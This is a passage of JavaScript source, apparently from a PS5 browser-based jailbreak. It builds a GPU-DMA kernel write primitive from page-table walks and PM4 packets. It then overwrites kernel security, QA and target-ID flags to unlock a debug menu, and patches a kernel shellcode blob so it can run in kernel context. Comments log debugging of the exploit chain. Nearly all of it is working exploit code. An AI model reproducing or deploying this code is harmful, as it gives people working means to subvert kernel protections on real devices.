            PRESENT: 0, RW: 1, USER: 2, WRITE_THROUGH: 3, CACHE_DISABLE: 4,
            ACCESSED: 5, DIRTY: 6, PS: 7, GLOBAL: 8,
            XOTEXT: 58, PROTECTION_KEY: 59, EXECUTE_DISABLE: 63
        };
        const CPU_PDE_MASKS = {
            PRESENT: 1n, RW: 1n, USER: 1n, WRITE_THROUGH: 1n, CACHE_DISABLE: 1n,
            ACCESSED: 1n, DIRTY: 1n, PS: 1n, GLOBAL: 1n,
            XOTEXT: 1n, PROTECTION_KEY: 0xfn, EXECUTE_DISABLE: 1n
        };
        const CPU_PG_PHYS_FRAME = 0x000ffffffffff000n;
        const CPU_PG_PS_FRAME = 0x000fffffffe00000n;

        function cpu_pde_field(pde, field) {
            return Number((pde >> BigInt(CPU_PDE_SHIFT[field])) & CPU_PDE_MASKS[field]);
        }

        function cpu_walk_pt(cr3, vaddr) {
            if (!vaddr || !cr3) throw new Error("cpu_walk_pt: invalid arguments");
            const pml4e_index = (vaddr >> 39n) & 0x1ffn;
            const pdpe_index = (vaddr >> 30n) & 0x1ffn;
            const pde_index = (vaddr >> 21n) & 0x1ffn;
            const pte_index = (vaddr >> 12n) & 0x1ffn;

            const pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8n);
            if (cpu_pde_field(pml4e, "PRESENT") !== 1) return null;

            const pdp_base_pa = pml4e & CPU_PG_PHYS_FRAME;
            const pdpe = kernel.read_qword(phys_to_dmap(pdp_base_pa) + pdpe_index * 8n);
            if (cpu_pde_field(pdpe, "PRESENT") !== 1) return null;

            const pd_base_pa = pdpe & CPU_PG_PHYS_FRAME;
            const pde = kernel.read_qword(phys_to_dmap(pd_base_pa) + pde_index * 8n);
            if (cpu_pde_field(pde, "PRESENT") !== 1) return null;
            if (cpu_pde_field(pde, "PS") === 1) {
                return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffffn);
            }

            const pt_base_pa = pde & CPU_PG_PHYS_FRAME;
            const pte = kernel.read_qword(phys_to_dmap(pt_base_pa) + pte_index * 8n);
            if (cpu_pde_field(pte, "PRESENT") !== 1) return null;
            return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fffn);
        }

        function phys_to_dmap(phys_addr) {
            if (!kernel.addr.dmap_base || !phys_addr)
                throw new Error("phys_to_dmap: invalid arguments");
            return kernel.addr.dmap_base + phys_addr;
        }

        function virt_to_phys(virt_addr, cr3) {
            if (!kernel.addr.dmap_base || !virt_addr)
                throw new Error("virt_to_phys: invalid arguments");
            cr3 = cr3 || kernel.addr.kernel_cr3;
            return cpu_walk_pt(cr3, virt_addr);
        }

        function get_proc_cr3(proc) {
            const vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE);
            const pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP);
            return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3);
        }

        function find_vmspace_pmap_offset() {
            const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
            const cur_scan_offset = 0x1C8n;
            for (let i = 1; i <= 6; i++) {
                const scan_val = kernel.read_qword(vmspace + cur_scan_offset + BigInt(i * 8));
                const offset_diff = Number(scan_val - vmspace);
                if (offset_diff >= 0x2C0 && offset_diff <= 0x2F0) {
                    return cur_scan_offset + BigInt(i * 8);
                }
            }
            throw new Error("failed to find VMSPACE_VM_PMAP offset");
        }

        function find_vmspace_vmid_offset() {
            const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
            const cur_scan_offset = 0x1D4n;
            for (let i = 1; i <= 8; i++) {
                const scan_offset = cur_scan_offset + BigInt(i * 4);
                const scan_val = Number(kernel.read_dword(vmspace + scan_offset));
                if (scan_val > 0 && scan_val <= 0x10) return scan_offset;
            }
            throw new Error("failed to find VMSPACE_VM_VMID offset");
        }

        const GPU_PDE_SHIFT = { VALID: 0, IS_PTE: 54, TF: 56, BLOCK_FRAGMENT_SIZE: 59 };
        const GPU_PDE_MASKS = { VALID: 1n, IS_PTE: 1n, TF: 1n, BLOCK_FRAGMENT_SIZE: 0x1fn };
        const GPU_PDE_ADDR_MASK = 0x0000ffffffffffc0n;

        function gpu_pde_field(pde, field) {
            return (pde >> BigInt(GPU_PDE_SHIFT[field])) & GPU_PDE_MASKS[field];
        }

        function gpu_walk_pt(vmid, virt_addr) {
            const pdb2_addr = get_pdb2_addr(vmid);
            const pml4e_index = (virt_addr >> 39n) & 0x1ffn;
            const pdpe_index = (virt_addr >> 30n) & 0x1ffn;
            const pde_index = (virt_addr >> 21n) & 0x1ffn;

            const pml4e = kernel.read_qword(pdb2_addr + pml4e_index * 8n);
            if (gpu_pde_field(pml4e, "VALID") !== 1n) return null;

            const pdp_base_pa = pml4e & GPU_PDE_ADDR_MASK;
            const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
            const pdpe = kernel.read_qword(pdpe_va);
            if (gpu_pde_field(pdpe, "VALID") !== 1n) return null;

            const pd_base_pa = pdpe & GPU_PDE_ADDR_MASK;
            const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
            const pde = kernel.read_qword(pde_va);
            if (gpu_pde_field(pde, "VALID") !== 1n) return null;
            if (gpu_pde_field(pde, "IS_PTE") === 1n) return [pde_va, 0x200000n];

            const fragment_size = gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE");
            const offset = virt_addr & 0x1fffffn;
            const pt_base_pa = pde & GPU_PDE_ADDR_MASK;
            let pte_index, pte, pte_va, page_size;

            if (fragment_size === 4n) {
                pte_index = offset >> 16n;
                pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
                pte = kernel.read_qword(pte_va);
                if (gpu_pde_field(pte, "VALID") === 1n && gpu_pde_field(pte, "TF") === 1n) {
                    pte_index = (virt_addr & 0xffffn) >> 13n;
                    pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
                    page_size = 0x2000n;
                } else {
                    page_size = 0x10000n;
                }
            } else if (fragment_size === 1n) {
                pte_index = offset >> 13n;
                pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
                page_size = 0x2000n;
            }
            return [pte_va, page_size];
        }

        let gpu = {};
        gpu.dmem_size = 2n * 0x100000n;
        gpu.fd = null;

        gpu.build_command_descriptor = function (gpu_addr, size_in_bytes) {
            const desc = malloc(16);
            const size_in_dwords = BigInt(size_in_bytes) >> 2n;
            const qword0 = ((gpu_addr & 0xFFFFFFFFn) << 32n) | 0xC0023F00n;
            const qword1 = ((size_in_dwords & 0xFFFFFn) << 32n) | ((gpu_addr >> 32n) & 0xFFFFn);
            write64(desc, qword0);
            write64(desc + 8n, qword1);
            return desc;
        };

        gpu.ioctl_submit_commands = function (pipe_id, cmd_count, cmd_descriptors_ptr) {
            const submit_struct = malloc(0x10);
            write32(submit_struct + 0x0n, BigInt(pipe_id));
            write32(submit_struct + 0x4n, BigInt(cmd_count));
            write64(submit_struct + 0x8n, cmd_descriptors_ptr);
            const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0108102n, submit_struct);
            if (ret !== 0n) throw new Error("ioctl submit failed: " + toHex(ret));
        };

        gpu.setup = function () {
            gpu.fd = syscall(SYSCALL.open, alloc_string("/dev/gc"), O_RDWR);
            if (gpu.fd === 0xffffffffffffffffn) throw new Error("Failed to open /dev/gc");

            const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
            const prot_rw = prot_ro | GPU_WRITE;

            const victim_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
            const transfer_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
            const cmd_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);

            const curproc_cr3 = get_proc_cr3(kernel.addr.curproc);
            const victim_real_pa = virt_to_phys(victim_va, curproc_cr3);

            const result = get_ptb_entry_of_relative_va(victim_va);
            if (!result) throw new Error("failed to setup gpu primitives");
            const [victim_ptbe_va, page_size] = result;
            if (!victim_ptbe_va || page_size !== gpu.dmem_size)
                throw new Error("failed to setup gpu primitives");

            if (syscall(SYSCALL.mprotect, victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn)
                throw new Error("mprotect() error");

            const initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va);
            const cleared_victim_ptbe_for_ro = initial_victim_ptbe_for_ro & (~victim_real_pa);

            gpu.victim_va = victim_va;
            gpu.transfer_va = transfer_va;
            gpu.cmd_va = cmd_va;
            gpu.victim_ptbe_va = victim_ptbe_va;
            gpu.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro;
        };

        gpu.pm4_type3_header = function (opcode, count) {
            const packet_type = 3n;
            const shader_type = 1n;
            const predicate = 0n;
            const result = (
                (predicate & 0x0n) |
                ((shader_type & 0x1n) << 1n) |
                ((opcode & 0xffn) << 8n) |
                (((count - 1n) & 0x3fffn) << 16n) |
                ((packet_type & 0x3n) << 30n)
            );
            return result & 0xFFFFFFFFn;
        };

        gpu.pm4_dma_data = function (dest_va, src_va, length) {
            const count = 6n;
            const bufsize = Number(4n * (count + 1n));
            const opcode = 0x50n;
            const command_len = BigInt(length) & 0x1fffffn;
            const pm4 = malloc(bufsize);

            const dma_data_header = (
                (0n & 0x1n) |
                ((0n & 0x1n) << 12n) |
                ((2n & 0x3n) << 13n) |
                ((1n & 0x1n) << 15n) |
                ((0n & 0x3n) << 20n) |
                ((0n & 0x1n) << 24n) |
                ((2n & 0x3n) << 25n) |
                ((1n & 0x1n) << 27n) |
                ((0n & 0x3n) << 29n) |
                ((1n & 0x1n) << 31n)
            ) & 0xFFFFFFFFn;

            write32(pm4, gpu.pm4_type3_header(opcode, count));
            write32(pm4 + 0x4n, dma_data_header);
            write32(pm4 + 0x8n, src_va & 0xFFFFFFFFn);
            write32(pm4 + 0xcn, src_va >> 32n);
            write32(pm4 + 0x10n, dest_va & 0xFFFFFFFFn);
            write32(pm4 + 0x14n, dest_va >> 32n);
            write32(pm4 + 0x18n, command_len);
            return read_buffer(pm4, bufsize);
        };

        gpu.submit_dma_data_command = function (dest_va, src_va, size) {
            const dma_data = gpu.pm4_dma_data(dest_va, src_va, size);
            write_buffer(gpu.cmd_va, dma_data);
            const desc = gpu.build_command_descriptor(gpu.cmd_va, dma_data.length);
            gpu.ioctl_submit_commands(0, 1, desc);
            nanosleep_ms(500);
        };

        gpu.transfer_physical_buffer = function (phys_addr, size, is_write) {
            const trunc_phys_addr = phys_addr & ~(gpu.dmem_size - 1n);
            const offset = phys_addr - trunc_phys_addr;
            if (offset + BigInt(size) > gpu.dmem_size)
                throw new Error("transfer beyond direct memory size: " + size);

            const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
            const prot_rw = prot_ro | GPU_WRITE;

            if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn)
                throw new Error("mprotect() error");

            const new_ptb = gpu.cleared_victim_ptbe_for_ro | trunc_phys_addr;
            kernel.write_qword(gpu.victim_ptbe_va, new_ptb);

            if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_rw) === 0xffffffffffffffffn)
                throw new Error("mprotect() error");

            let src, dst;
            if (is_write) { src = gpu.transfer_va; dst = gpu.victim_va + offset; }
            else { src = gpu.victim_va + offset; dst = gpu.transfer_va; }

            gpu.submit_dma_data_command(dst, src, size);
        };

        gpu.write_buffer = function (addr, buf) {
            const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
            if (!phys_addr) throw new Error("v2p failed for " + toHex(addr));
            write_buffer(gpu.transfer_va, buf);
            gpu.transfer_physical_buffer(phys_addr, buf.length, true);
        };

        gpu.write_byte = function (dest, value) {
            const buf = new Uint8Array(1);
            buf[0] = Number(value & 0xFFn);
            gpu.write_buffer(dest, buf);
        };
        gpu.write_dword = function (dest, value) {
            const buf = new Uint8Array(4);
            for (let i = 0; i < 4; i++) buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
            gpu.write_buffer(dest, buf);
        };

        function alloc_main_dmem(size, prot, flag) {
            const out = malloc(8);
            const mem_type = 1n;
            const size_big = typeof size === "bigint" ? size : BigInt(size);
            const prot_big = typeof prot === "bigint" ? prot : BigInt(prot);
            const flag_big = typeof flag === "bigint" ? flag : BigInt(flag);
            const ret = call(sceKernelAllocateMainDirectMemory, size_big, size_big, mem_type, out);
            if (ret !== 0n)
                throw new Error("sceKernelAllocateMainDirectMemory() error: " + toHex(ret));
            const phys_addr = read64(out);
            write64(out, 0n);
            const name_buf = alloc_string("mem");
            const ret2 = call(sceKernelMapNamedDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big, name_buf);
            if (ret2 !== 0n)
                throw new Error("sceKernelMapNamedDirectMemory() error: " + toHex(ret2));
            return read64(out);
        }

        function get_curproc_vmid() {
            const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
            const vmid = kernel.read_dword(vmspace + kernel_offset.VMSPACE_VM_VMID);
            return Number(vmid);
        }

        function get_gvmspace(vmid) {
            const vmid_big = typeof vmid === "bigint" ? vmid : BigInt(vmid);
            const gvmspace_base = kernel.addr.data_base + kernel_offset.DATA_BASE_GVMSPACE;
            return gvmspace_base + vmid_big * kernel_offset.SIZEOF_GVMSPACE;
        }

        function get_pdb2_addr(vmid) {
            return kernel.read_qword(get_gvmspace(vmid) + kernel_offset.GVMSPACE_PAGE_DIR_VA);
        }

        function get_relative_va(vmid, va) {
            if (typeof va !== "bigint") throw new Error("va must be BigInt");
            const gvmspace = get_gvmspace(vmid);
            const size = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_SIZE);
            const start_addr = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_START_VA);
            const end_addr = start_addr + size;
            if (va >= start_addr && va < end_addr) return va - start_addr;
            return null;
        }

        function get_ptb_entry_of_relative_va(virt_addr) {
            const vmid = get_curproc_vmid();
            const relative_va = get_relative_va(vmid, virt_addr);
            if (!relative_va)
                throw new Error("invalid virtual addr " + toHex(virt_addr) + " for vmid " + vmid);
            return gpu_walk_pt(vmid, relative_va);
        }

        async function stage_debug_menu(S) {
            const O = S.OFF;
            try {
                if (!O.DATA_BASE_SECURITY_FLAGS || !O.DATA_BASE_KERNEL_PMAP_STORE ||
                    !O.DATA_BASE_GVMSPACE) {
                    await ulog("stage_debug: per-FW offsets missing for " + FW_VERSION +
                        " - skipping debug menu");
                    return;
                }
                if (!S.data_base || !S.curproc) {
                    await ulog("stage_debug: data_base/curproc missing - skipped");
                    return;
                }

                kernel.read_buffer = (kaddr, size) => {
                    S.kread(S.scratch_big, BigInt(kaddr), Number(size));
                    return read_buffer(S.scratch_big, Number(size));
                };
                kernel.write_buffer = (kaddr, buf) => {
                    write_buffer(S.scratch_big, buf);
                    S.kwrite(BigInt(kaddr), S.scratch_big, buf.length);
                };
                kernel.addr.curproc = S.curproc;
                kernel.addr.data_base = S.data_base;

                const pmap_store = S.data_base + O.DATA_BASE_KERNEL_PMAP_STORE;
                const pml4 = S.kread64(pmap_store + O.PMAP_PML4);
                const cr3 = S.kread64(pmap_store + O.PMAP_CR3);
                const dmap_base = pml4 - cr3;
                await ulog("stage_debug: pmap_store=" + toHex(pmap_store) +
                    " pml4=" + toHex(pml4) + " cr3=" + toHex(cr3) +
                    " dmap_base=" + toHex(dmap_base));

                const cr3_ok = cr3 !== 0n && (cr3 & 0xFFFn) === 0n && cr3 < 0x800000000n;
                const dmap_ok = (dmap_base >> 48n) === 0xFFFFn && (dmap_base & 0xFFFn) === 0n;
                if (!cr3_ok || !dmap_ok) {
                    // DO NOT BLAME THE OFFSET. DATA_BASE_KERNEL_PMAP_STORE is
                    // verified correct for every 12.x, retail and devkit, by
                    // three independent methods (raw disp32 scan, capstone,
                    // Ghidra headless) against the decrypted kernels.
                    //
                    // The realistic cause is the cr3 bound above. A PS5 whose
                    // kernel PML4 lands past 32 GiB physical fails
                    // `cr3 < 0x800000000n` while being completely valid -- seen
                    // on 12.40 with cr3=0x886011000 (34.09 GiB), where dmap_base
                    // subtracted out to a clean 0xffff8dae00000000, which a
                    // wrong pmap_store could not produce. The bound is left as
                    // it is on purpose: raising it would ENABLE the four kernel
                    // writes below on consoles that currently skip them and
                    // complete fine, and that is a behaviour change that needs a
                    // test run, not a guess.
                    await ulog("stage_debug: pmap/dmap check failed for FW " + FW_VERSION +
                        " (cr3_ok=" + cr3_ok + " dmap_ok=" + dmap_ok +
                        ") cr3=" + toHex(cr3) +
                        " - debug menu skipped; the jailbreak is unaffected." +
                        (dmap_ok && !cr3_ok
                            ? " dmap_base is well formed, so the pmap_store offset is fine;" +
                              " cr3 is simply above the 32 GiB sanity bound."
                            : ""));
                    return;
                }
                kernel.addr.kernel_cr3 = cr3;
                kernel.addr.dmap_base = dmap_base;

                kernel_offset.VMSPACE_VM_PMAP = find_vmspace_pmap_offset();
                kernel_offset.VMSPACE_VM_VMID = find_vmspace_vmid_offset();
                await ulog("stage_debug: VMSPACE_VM_PMAP=" +
                    toHex(kernel_offset.VMSPACE_VM_PMAP) + " VM_VMID=" +
                    toHex(kernel_offset.VMSPACE_VM_VMID));

                gpu.setup();
                await ulog("stage_debug: gpu.setup() ok - GPU-DMA write primitive ready");

                const sf_addr = S.data_base + O.DATA_BASE_SECURITY_FLAGS;
                const tid_addr = S.data_base + O.DATA_BASE_TARGET_ID;
                const qa_addr = S.data_base + O.DATA_BASE_QA_FLAGS;
                const ut_addr = S.data_base + O.DATA_BASE_UTOKEN_FLAGS;

                const sf0 = kernel.read_dword(sf_addr);
                await ulog("stage_debug: security_flags before=" + toHex(sf0));
                gpu.write_dword(sf_addr, sf0 | 0x14n);
                const sf = kernel.read_dword(sf_addr);
                await ulog("stage_debug: security_flags after=" + toHex(sf));

                const tid0 = kernel.read_byte(tid_addr);
                await ulog("stage_debug: target_id before=" + toHex(tid0));
                gpu.write_byte(tid_addr, 0x82n);
                const tid = kernel.read_byte(tid_addr);
                await ulog("stage_debug: target_id after=" + toHex(tid));

                const qa0 = kernel.read_dword(qa_addr);
                await ulog("stage_debug: qa_flags before=" + toHex(qa0));
                gpu.write_dword(qa_addr, qa0 | 0x10300n);
                const qa = kernel.read_dword(qa_addr);
                await ulog("stage_debug: qa_flags after=" + toHex(qa));

                const ut0 = kernel.read_byte(ut_addr);
                await ulog("stage_debug: utoken_flags before=" + toHex(ut0));
                gpu.write_byte(ut_addr, ut0 | 0x1n);
                const ut = kernel.read_byte(ut_addr);
                await ulog("stage_debug: utoken_flags after=" + toHex(ut));

                const ok = ((sf & 0x14n) === 0x14n) && ((tid & 0xffn) === 0x82n) &&
                    ((qa & 0x10300n) === 0x10300n) && ((ut & 0x1n) === 0x1n);
                await ulog("stage_debug: " +
                    (ok ? "=> DEBUG MENU ENABLED" : "=> verify FAILED"));
            } catch (e) {
                await ulog("stage_debug: GPU debug-menu path failed: " + e.message +
                    " (jailbreak unaffected)");
            }
        }

        // ===================================================================
        // KEXP HANDOFF - the mechanism poopsploit PROVED on this exact console
        // ===================================================================
        // WHAT WAS DELETED HERE AND WHY (elf_parse + elf_run, ~460 lines):
        // p2jb used to PARSE elfldr-ps5-1360.elf, map its PT_LOADs, apply its 140
        // R_X86_64_RELATIVE relocations, jitshm-alias a write shadow over the text, verify
        // the exec view (ELF-XVERIFY), build a 6-field payload_args and start a userland
        // thread at the ELF's own e_entry. Every one of those steps was verified working on
        // hardware - and the payload still died on entry in eight consecutive runs.
        // The reason: that entire ABI comes from poops's main.js `execute_elf_store`, which
        // is the 10.00 loader and NEVER RUNS ON 12.00. Instrumenting it with a PARGS beacon
        // produced ZERO lines on a fully successful 12.00 poops run - poops.html's harness
        // ladder (POOPS-VERDICT / STAGE5 / POOPS-COMPLETE) never calls it.
        // What DOES run on 12.00 is poops.js stage5, and it is a different mechanism:
        //   * elfldr is handed over as a RAW DATA BLOB in plain MAP_ANON RW memory,
        //     unparsed and unrelocated - the blob needs no exec permission at all;
        //   * the thing that is EXECUTED is a KERNEL SHELLCODE, payloads/kexp_2026_05_25.bin
        //     (18912 bytes, byte-identical in both trees), mapped RWX from a jitshm CREATE
        //     handle - the one recipe with an observed success on this firmware
        //     (STAGE5-DONE joinRet=0 shellcodeRet=0x0, ps10_stage5 PASS).
        // So the payload was never startable the way p2jb was starting it, which is exactly
        // why hypothesis after hypothesis died with everything else measuring correct.
        //
        // WHY THE SPAWN DEBATE IS OVER: poops has both a thr_new branch and a pthread
        // branch, and PK.STAGE5_SPAWN defaults to "pthread" - the recorded 12.00 success
        // ("joinRet=0") is therefore the pthread branch, using scePthreadCreate with a sized
        // attr (12.00 has all six OFFSET_lk_scePthread* offsets). That is the default here.
        // ?spawn=thr_new selects the raw thr_new branch instead (spawn_native_thread, which
        // is byte-for-byte poops's own thr_new branch: TLS self-pointer at +0, thr_exit stub
        // in the top 16 stack slots, param+0x00 = entry, param+0x08 = args).
        // Note the kexp shellcode itself calls pthread_create/pthread_join through the
        // resolved slots below, so it wants a thread with real TLS - another reason the
        // pthread branch is the default and the thr_new branch is the experiment.
        const KEXP_EXPECTED_SIZE = 18912;

        // Signature bytes verified offline against p2jb\payloads\kexp_2026_05_25.bin
        // (sha1 c9e8906333e5, md5 2e8b121e0e83). NOTE: this is NOT the blob poopsploit
        // ships any more - poopsploit switched to j0rdy's pre-silenced build
        // (sha1 f7bb61131c5f) whose three elfldr-window log calls are already NOPed.
        // Both blobs are 18912 bytes and both satisfy the three signatures below,
        // and the NOP loop further down is a no-op on an already-silenced blob.
        // These are the two `call resolver` sites and the getpid resolution block; if the
        // blob is ever swapped they stop matching and we refuse to run it rather than
        // executing a shellcode we have patched at the wrong offsets.
        const KEXP_CALL_A = [0xe8, 0xcf, 0x00, 0x00, 0x00];              // @0x1c
        const KEXP_CALL_B = [0xe8, 0x78, 0x01, 0x00, 0x00];              // @0x23
        const KEXP_GETPID_BLOCK = [                                       // @0x10f1
            0x48, 0x8d, 0x35, 0xac, 0x30, 0x00, 0x00,
            0x48, 0x8d, 0x55, 0xd0,
            0xbf, 0x01, 0x20, 0x00, 0x00,
            0xe8, 0x41, 0x2b, 0x00, 0x00,
        ];
        const KEXP_GETPID_TAIL = [0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0];   // @0x10fb

        // The per-fw offsets live in poops's offsets/<fw>.js, which main.js injects as a
        // classic script - so they are top-level `const` bindings in the global LEXICAL
        // scope, reachable by bare name but NOT as window properties. typeof-guard every
        // read (a bare reference to a missing const is a ReferenceError, not undefined).
        function kexp_offsets() {
            const n = (v) => (typeof v === "number" ? v : -1);
            return {
                lk_notify: n(typeof OFFSET_lk_sceKernelSendNotificationRequest !== "undefined"
                    ? OFFSET_lk_sceKernelSendNotificationRequest : undefined),
                lk_sysctlbyname: n(typeof OFFSET_lk_sysctlbyname !== "undefined"
                    ? OFFSET_lk_sysctlbyname : undefined),
                lk_pthread_create: n(typeof OFFSET_lk_pthread_create !== "undefined"
                    ? OFFSET_lk_pthread_create : undefined),
                lk_pthread_join: n(typeof OFFSET_lk_pthread_join !== "undefined"
                    ? OFFSET_lk_pthread_join : undefined),
                lk_getpid: n(typeof OFFSET_lk_getpid !== "undefined"
                    ? OFFSET_lk_getpid : undefined),
                lc_malloc: n(typeof OFFSET_lc_malloc !== "undefined" ? OFFSET_lc_malloc : undefined),
                lc_free: n(typeof OFFSET_lc_free !== "undefined" ? OFFSET_lc_free : undefined),
                lc_memcpy: n(typeof OFFSET_lc_memcpy !== "undefined" ? OFFSET_lc_memcpy : undefined),
                lc_memset: n(typeof OFFSET_lc_memset !== "undefined" ? OFFSET_lc_memset : undefined),
                lc_strcmp: n(typeof OFFSET_lc_strcmp !== "undefined" ? OFFSET_lc_strcmp : undefined),
                lc_memcmp: n(typeof OFFSET_lc_memcmp !== "undefined" ? OFFSET_lc_memcmp : undefined),
                lc_vsnprintf: n(typeof OFFSET_lc_vsnprintf !== "undefined"
                    ? OFFSET_lc_vsnprintf : undefined),
                lk_sce_create: n(typeof OFFSET_lk_scePthreadCreate !== "undefined"
                    ? OFFSET_lk_scePthreadCreate : undefined),
                lk_sce_join: n(typeof OFFSET_lk_scePthreadJoin !== "undefined"
                    ? OFFSET_lk_scePthreadJoin : undefined),
                lk_sce_attr_init: n(typeof OFFSET_lk_scePthreadAttrInit !== "undefined"
                    ? OFFSET_lk_scePthreadAttrInit : undefined),
                lk_sce_attr_stacksize: n(typeof OFFSET_lk_scePthreadAttrSetstacksize !== "undefined"
                    ? OFFSET_lk_scePthreadAttrSetstacksize : undefined),
                lk_sce_attr_detach: n(typeof OFFSET_lk_scePthreadAttrSetdetachstate !== "undefined"
                    ? OFFSET_lk_scePthreadAttrSetdetachstate : undefined),
                lk_sce_attr_destroy: n(typeof OFFSET_lk_scePthreadAttrDestroy !== "undefined"
                    ? OFFSET_lk_scePthreadAttrDestroy : undefined),
            };
        }

        function u8_w64(u8, off, v) {
            let x = BigInt(v) & 0xFFFFFFFFFFFFFFFFn;
            for (let i = 0; i < 8; i++) { u8[off + i] = Number(x & 0xFFn); x >>= 8n; }
        }
        function u8_r32(u8, off) {
            return ((u8[off] | (u8[off + 1] << 8) | (u8[off + 2] << 16) | (u8[off + 3] << 24)) >>> 0);
        }
        function bytes_at(u8, off, expected) {
            for (let i = 0; i < expected.length; i++)
                if (u8[off + i] !== expected[i]) return false;
            return true;
        }

        // The shipped kexp resolves 11 libkernel/libc functions through syscall 0x24f and
        // executes UD2 if any lookup fails; a WebProcess is refused by that resolver. poops
        // NOPs the two resolver calls and writes the addresses straight into the PIC slots
        // (poops.js:8437-8466). Same here - and the same refuse-on-mismatch discipline, so
        // a profile without these offsets fails loudly instead of running a half-patched
        // shellcode in kernel context.
        function kexp_patch_resolver(bin, kbase, cbase) {
            const O = kexp_offsets();
            const need = [
                ["lk_notify", O.lk_notify], ["lk_sysctlbyname", O.lk_sysctlbyname],
                ["lk_pthread_create", O.lk_pthread_create], ["lk_pthread_join", O.lk_pthread_join],
                ["lc_malloc", O.lc_malloc], ["lc_free", O.lc_free],
                ["lc_memcpy", O.lc_memcpy], ["lc_memset", O.lc_memset],
                ["lc_strcmp", O.lc_strcmp], ["lc_memcmp", O.lc_memcmp],
                ["lc_vsnprintf", O.lc_vsnprintf], ["lk_getpid", O.lk_getpid],
            ];
            const missing = need.filter(([, v]) => v < 0).map(([k]) => k);
            if (missing.length)
                fail("kexp: firmware profile is missing " + missing.join(",")
                    + " - cannot bypass the shellcode's internal resolver");
            if (bin.length !== KEXP_EXPECTED_SIZE)
                fail("kexp: expected " + KEXP_EXPECTED_SIZE + " bytes, got " + bin.length);
            if (!bytes_at(bin, 0x1c, KEXP_CALL_A) || !bytes_at(bin, 0x23, KEXP_CALL_B)
                || !bytes_at(bin, 0x10f1, KEXP_GETPID_BLOCK))
                fail("kexp: resolver-bypass signature check failed"
                    + " (@0x1c=" + toHex(BigInt(u8_r32(bin, 0x1c)))
                    + " @0x23=" + toHex(BigInt(u8_r32(bin, 0x23)))
                    + " @0x10f1=" + toHex(BigInt(u8_r32(bin, 0x10f1)))
                    + ") - blob does not match the one this patch was derived from");

            for (let i = 0; i < 5; i++) { bin[0x1c + i] = 0x90; bin[0x23 + i] = 0x90; }
            const slots = [
                [0x48b0, kbase + BigInt(O.lk_notify)],
                [0x48b8, kbase + BigInt(O.lk_sysctlbyname)],
                [0x48c0, kbase + BigInt(O.lk_pthread_create)],
                [0x48c8, kbase + BigInt(O.lk_pthread_join)],
                [0x48d0, cbase + BigInt(O.lc_malloc)],
                [0x48d8, cbase + BigInt(O.lc_free)],
                [0x48e0, cbase + BigInt(O.lc_memcpy)],
                [0x48e8, cbase + BigInt(O.lc_memset)],
                [0x48f0, cbase + BigInt(O.lc_strcmp)],
                [0x48f8, cbase + BigInt(O.lc_memcmp)],
                [0x4900, cbase + BigInt(O.lc_vsnprintf)],
            ];
            for (const [slot, addr] of slots) u8_w64(bin, slot, addr);

            // getpid is resolved inline rather than through a slot: replace the lea/mov/call
            // sequence with `mov rax, <getpid stub>` + `mov [rbp-0x30], rax` + `xor eax,eax`,
            // then NOP the tail of the original block.
            const getpid = kbase + BigInt(O.lk_getpid);
            bin[0x10f1] = 0x48; bin[0x10f2] = 0xb8;
            u8_w64(bin, 0x10f3, getpid);
            for (let i = 0; i < KEXP_GETPID_TAIL.length; i++)
                bin[0x10fb + i] = KEXP_GETPID_TAIL[i];
            for (let i = 0x1101; i < 0x1106; i++) bin[i] = 0x90;

            /* SILENCE THE THREE HEAVY-STACK LOG CALLS IN THE elfldr WINDOW.
             *
             * kexp has two printf-style loggers. The one at 0x980 opens with `sub rsp, 0xf0`
             * (240 bytes) and is called from 64 sites - harmless. The one at 0x8b0 opens with
             * `sub rsp, 0xd00`, a 3328-byte frame, and three of its seven call sites run on
             * the freshly created elfldr KERNEL thread:
             *
             *     0x126d  "Created elfldr thread with id %i !!"
             *     0x12ad  "elfldr returned %#lx !!"
             *     0x3bc2  "qa flags patches applied !!"
             *
             * A 3.3KB frame on that thread overruns its stack into the guard page, and
             * FreeBSD reports a guard hit as `panic: vm_fault: fault on nofault entry`. Our
             * UART capture ends at "[kexp] init loader started..." with exactly that panic -
             * the next line would have been the 0x126d call.
             *
             * j0rdy's slopkit ships this same blob (same name, same 18912 bytes) with exactly
             * these three calls NOPed; we shipped the un-silenced original, which is the only
             * difference between the two files. Patch them here rather than editing the blob,
             * so payloads/kexp_2026_05_25.bin stays byte-identical to upstream and the change
             * is visible in the diff. The signature checks above (0x1c, 0x23, 0x10f1) sit
             * nowhere near these offsets and still pass.
             *
             * Each site is checked for a real 0xE8 call first, so running against an already
